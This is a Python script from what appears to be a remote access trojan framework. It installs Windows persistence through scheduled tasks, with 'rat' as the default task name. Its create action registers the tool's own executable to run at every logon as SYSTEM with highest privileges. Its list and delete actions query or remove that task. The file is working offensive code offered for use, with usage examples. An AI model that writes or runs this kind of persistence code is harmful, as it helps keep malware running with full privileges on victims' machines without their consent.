# exec win/persist/schtasks.py --action create
# exec win/persist/schtasks.py --action delete
# exec win/persist/schtasks.py --action list --name MyTask
# exec win/persist/schtasks.py --action list

import subprocess

from core.utils.client_util import get_executable_path

# 默认配置
DEFAULT_NAME = 'rat'
EXECUTABLE_PATH = get_executable_path()


def schtasks(action='list', name=None):
    """计划任务管理

    Args:
        action: create - 创建, delete - 删除, list - 查看
        name: 任务名称，默认 rat
    """
    if name is None:
        name = DEFAULT_NAME

    if action == 'list':
        # 检查指定任务是否存在
        result = subprocess.run(f'schtasks.exe /query /tn "{name}"', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f'✓ Scheduled task "{name}" exists')
            # 显示任务详情
            result = subprocess.run(f'schtasks.exe /query /tn "{name}" /fo LIST', shell=True, capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.strip():
                    print(f'  {line.strip()}')
        else:
            print(f'✗ Scheduled task "{name}" does not exist')
        return

    if action == 'delete':
        result = subprocess.run(f'schtasks.exe /delete /tn "{name}" /f', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f'✓ Scheduled task "{name}" removed')
        else:
            print(f'✗ Failed to remove scheduled task "{name}": {result.stderr.strip()}')
        return

    if action == 'create':
        cmd = f'schtasks.exe /create /tn "{name}" /sc onlogon /ru system /rl highest /tr "{EXECUTABLE_PATH}" /f'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f'✓ Scheduled task "{name}" created')
            print(f'  Trigger: At log on')
            print(f'  Run as: SYSTEM')
            print(f'  Action: {EXECUTABLE_PATH}')
        else:
            print(f'✗ Failed to create scheduled task: {result.stderr.strip()}')
        return

    print(f'Unknown action: {action}')
    print_usage()


def print_usage():
    """打印使用说明"""
    print('\n' + '=' * 50)
    print('Scheduled Task Persistence Script')
    print('=' * 50)
    print('\nUsage:')
    print('  --action create               Create scheduled task (default name: rat)')
    print('  --action delete               Delete scheduled task (default name: rat)')
    print('  --action list                 Check if task exists (default name: rat)')
    print('  --action list --name MyTask   Check specific task')
    print('  --action create --name MyTask Create with custom name')
    print('  --action delete --name MyTask Delete with custom name')
    print('\nExamples:')
    print('  exec win/persist/schtasks.py --action create')
    print('  exec win/persist/schtasks.py --action list --name MyTask')
    print('  exec win/persist/schtasks.py --action delete --name MyTask')
    print('=' * 50)


# 从 kwargs 获取参数
action = kwargs.get('action', 'list')
name = kwargs.get('name', None)

if action == 'help':
    print_usage()
else:
    schtasks(action=action, name=name)